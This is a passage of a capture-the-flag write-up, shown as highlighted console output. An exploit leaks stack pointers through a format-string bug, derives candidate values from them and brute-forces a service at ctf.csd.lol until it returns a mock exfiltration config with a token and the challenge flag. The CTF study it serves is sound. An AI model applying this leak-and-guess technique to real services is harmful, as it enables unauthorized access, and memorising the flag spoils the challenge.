+<span class="w">    </span><span class="mh">0x7f81d332f643</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="mh">0x7f81d32475a4</span><span class="w"> </span><span class="mh">0x5</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="mh">0x7ffed5dd78c0</span><span class="w"> </span><span class="mh">0x40159a</span><span class="w"> </span><span class="mh">0xa64616572</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="mh">0x7f81d3361af0</span><span class="w"> </span><span class="mh">0x7ffed5dd79a0</span><span class="w"> </span><span class="mh">0x500f2e52d5dd79e8</span><span class="w"> </span><span class="mh">0x7ffed5dd7960</span><span class="w"> </span><span class="mh">0x7f81d31551ca</span><span class="w"> </span><span class="mh">0x7ffed5dd7910</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Leak</span><span class="w"> </span><span class="nx">line</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7f81d332f643</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="mh">0x7f81d32475a4</span><span class="w"> </span><span class="mh">0x5</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="mh">0x7ffed5dd78c0</span><span class="w"> </span><span class="mh">0x40159a</span><span class="w"> </span><span class="mh">0xa64616572</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">nil</span><span class="p">)</span><span class="w"> </span><span class="mh">0x7f81d3361af0</span><span class="w"> </span><span class="mh">0x7ffed5dd79a0</span><span class="w"> </span><span class="mh">0x500f2e52d5dd79e8</span><span class="w"> </span><span class="mh">0x7ffed5dd7960</span><span class="w"> </span><span class="mh">0x7f81d31551ca</span><span class="w"> </span><span class="mh">0x7ffed5dd7910</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">Pointers</span><span class="w"> </span><span class="nx">leaked</span><span class="o">:</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">0</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7f81d332f643</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7f81d32475a4</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">2</span><span class="o">:</span><span class="w"> </span><span class="mh">0x5</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">3</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7ffed5dd78c0</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">4</span><span class="o">:</span><span class="w"> </span><span class="mh">0x40159a</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">5</span><span class="o">:</span><span class="w"> </span><span class="mh">0xa64616572</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">6</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7f81d3361af0</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">7</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7ffed5dd79a0</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">8</span><span class="o">:</span><span class="w"> </span><span class="mh">0x500f2e52d5dd79e8</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">9</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7ffed5dd7960</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">10</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7f81d31551ca</span>
+<span class="w">  </span><span class="nx">idx</span><span class="w"> </span><span class="mf">11</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7ffed5dd7910</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">Derived</span><span class="w"> </span><span class="nx">candidates</span><span class="w"> </span><span class="p">(</span><span class="kr">from</span><span class="w"> </span><span class="nx">each</span><span class="w"> </span><span class="o">%</span><span class="nx">p</span><span class="p">)</span><span class="o">:</span>
+<span class="nx">idx</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">pointer</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="mf">64</span><span class="o">-</span><span class="nx">bit</span><span class="w"> </span><span class="nx">hex</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="nx">upper_hex</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">upper_dec</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">lower_hex</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">lower_dec</span>
+<span class="o">----+-------------------+-----------------+-----------+-----------+-----------+----------</span>
+<span class="w">  </span><span class="mf">0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7f81d332f643</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81d332f643</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32641</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d332f643</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3543332419</span>
+<span class="w">  </span><span class="mf">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7f81d32475a4</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81d32475a4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32641</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d32475a4</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3542381988</span>
+<span class="w">  </span><span class="mf">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x5</span><span class="w">               </span><span class="o">|</span><span class="w"> </span><span class="mo">0000000000000005</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00000000</span><span class="w">  </span><span class="o">|</span><span class="w">         </span><span class="mf">0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00000005</span><span class="w">  </span><span class="o">|</span><span class="w">         </span><span class="mf">5</span>
+<span class="w">  </span><span class="mf">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7ffed5dd78c0</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffed5dd78c0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffe</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32766</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d5dd78c0</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3588061376</span>
+<span class="w">  </span><span class="mf">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x40159a</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="mo">00000000004015</span><span class="mf">9</span><span class="nx">a</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00000000</span><span class="w">  </span><span class="o">|</span><span class="w">         </span><span class="mf">0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">004015</span><span class="mf">9</span><span class="nx">a</span><span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="mf">4199834</span>
+<span class="w">  </span><span class="mf">5</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0xa64616572</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="mo">0000000</span><span class="nx">a64616572</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">0000000</span><span class="nx">a</span><span class="w">  </span><span class="o">|</span><span class="w">        </span><span class="mf">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">64616572</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">1684104562</span>
+<span class="w">  </span><span class="mf">6</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7f81d3361af0</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81d3361af0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32641</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d3361af0</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3543538416</span>
+<span class="w">  </span><span class="mf">7</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7ffed5dd79a0</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffed5dd79a0</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffe</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32766</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d5dd79a0</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3588061600</span>
+<span class="w">  </span><span class="mf">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x500f2e52d5dd79e8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">500</span><span class="nx">f2e52d5dd79e8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">500</span><span class="nx">f2e52</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">1343172178</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d5dd79e8</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3588061672</span>
+<span class="w">  </span><span class="mf">9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7ffed5dd7960</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffed5dd7960</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffe</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32766</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d5dd7960</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3588061536</span>
+<span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7f81d31551ca</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81d31551ca</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">f81</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32641</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d31551ca</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3541389770</span>
+<span class="w"> </span><span class="mf">11</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x7ffed5dd7910</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffed5dd7910</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">00007</span><span class="nx">ffe</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="mf">32766</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">d5dd7910</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mf">3588061456</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx0</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">f81</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">32641</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx0</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">f81</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx0</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d332f643</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3543332419</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx0</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d332f643</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx1</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">f81</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">32641</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx1</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">f81</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx1</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d32475a4</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3542381988</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx1</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d32475a4</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx2</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00000000</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx2</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00000000</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx2</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="mo">00000005</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx2</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="mo">00000005</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx3</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">ffe</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">32766</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx3</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">ffe</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx3</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d5dd78c0</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3588061376</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx3</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d5dd78c0</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx4</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00000000</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx4</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00000000</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx4</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="mo">004015</span><span class="mf">9</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">4199834</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx4</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="mo">004015</span><span class="mf">9</span><span class="nx">a</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx5</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">0000000</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx5</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">0000000</span><span class="nx">a</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx5</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="mf">64616572</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1684104562</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx5</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="mf">64616572</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx6</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">f81</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">32641</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx6</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">f81</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx6</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d3361af0</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3543538416</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx6</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d3361af0</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx7</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">ffe</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">32766</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx7</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mo">00007</span><span class="nx">ffe</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx7</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d5dd79a0</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3588061600</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx7</span><span class="o">-</span><span class="nx">lower</span><span class="p">(</span><span class="nx">d5dd79a0</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">denied</span>
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">candidate</span><span class="w"> </span><span class="nx">idx8</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mf">500</span><span class="nx">f2e52</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1343172178</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Response</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">idx8</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mf">500</span><span class="nx">f2e52</span><span class="p">)</span><span class="o">:</span>
+<span class="w">     </span><span class="err">#</span><span class="w"> </span><span class="nx">KRAMPUS</span><span class="w"> </span><span class="nx">SYNDICATE</span><span class="w"> </span><span class="nx">EXFIL</span><span class="w"> </span><span class="nx">v1</span><span class="mf">.4</span>
+<span class="w">    </span><span class="nx">node_id</span><span class="o">:</span><span class="w"> </span><span class="nx">krps</span><span class="o">-</span><span class="nx">ops</span><span class="o">-</span><span class="nx">node12</span>
+<span class="w">    </span><span class="nx">channel</span><span class="o">:</span><span class="w"> </span><span class="nx">steady</span>
+<span class="w">    </span><span class="nx">auth_token</span><span class="o">:</span><span class="w"> </span><span class="nx">a94f210033bb91ef2201df009ab1</span>
+<span class="w">    </span><span class="nx">rotation_tag</span><span class="o">:</span><span class="w"> </span><span class="nx">csd</span><span class="p">{</span><span class="nx">Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92</span><span class="p">}</span>
+<span class="w">    </span><span class="nx">last_sync</span><span class="o">:</span><span class="w"> </span><span class="mf">2025</span><span class="o">-</span><span class="mf">11</span><span class="o">-</span><span class="mf">29</span><span class="nx">T02</span><span class="o">:</span><span class="mf">11</span><span class="nx">Z</span>
+<span class="w">    </span><span class="nx">checksum</span><span class="o">:</span><span class="w"> </span><span class="mf">4</span><span class="nx">be2f1aa</span>
+
+<span class="w">    </span><span class="nx">cmd</span><span class="o">:</span>
+
+<span class="o">======</span><span class="w"> </span><span class="nx">POSSIBLE</span><span class="w"> </span><span class="nx">SUCCESS</span><span class="w"> </span><span class="o">======</span>
+<span class="nx">Candidate</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">idx8</span><span class="o">-</span><span class="nx">upper</span><span class="p">(</span><span class="mf">500</span><span class="nx">f2e52</span><span class="p">)</span>
+<span class="nx">Value</span><span class="w">     </span><span class="o">:</span><span class="w"> </span><span class="mf">1343172178</span>
+<span class="nx">Full</span><span class="w"> </span><span class="nx">response</span><span class="o">:</span>
+<span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">KRAMPUS</span><span class="w"> </span><span class="nx">SYNDICATE</span><span class="w"> </span><span class="nx">EXFIL</span><span class="w"> </span><span class="nx">v1</span><span class="mf">.4</span>
+<span class="nx">node_id</span><span class="o">:</span><span class="w"> </span><span class="nx">krps</span><span class="o">-</span><span class="nx">ops</span><span class="o">-</span><span class="nx">node12</span>
+<span class="nx">channel</span><span class="o">:</span><span class="w"> </span><span class="nx">steady</span>
+<span class="nx">auth_token</span><span class="o">:</span><span class="w"> </span><span class="nx">a94f210033bb91ef2201df009ab1</span>
+<span class="nx">rotation_tag</span><span class="o">:</span><span class="w"> </span><span class="nx">csd</span><span class="p">{</span><span class="nx">Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92</span><span class="p">}</span>
+<span class="nx">last_sync</span><span class="o">:</span><span class="w"> </span><span class="mf">2025</span><span class="o">-</span><span class="mf">11</span><span class="o">-</span><span class="mf">29</span><span class="nx">T02</span><span class="o">:</span><span class="mf">11</span><span class="nx">Z</span>
+<span class="nx">checksum</span><span class="o">:</span><span class="w"> </span><span class="mf">4</span><span class="nx">be2f1aa</span>
+
+<span class="nx">cmd</span><span class="o">:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Closed</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">ctf</span><span class="p">.</span><span class="nx">csd</span><span class="p">.</span><span class="nx">lol</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="mf">7777</span>
+</code></pre></div>
+<hr>
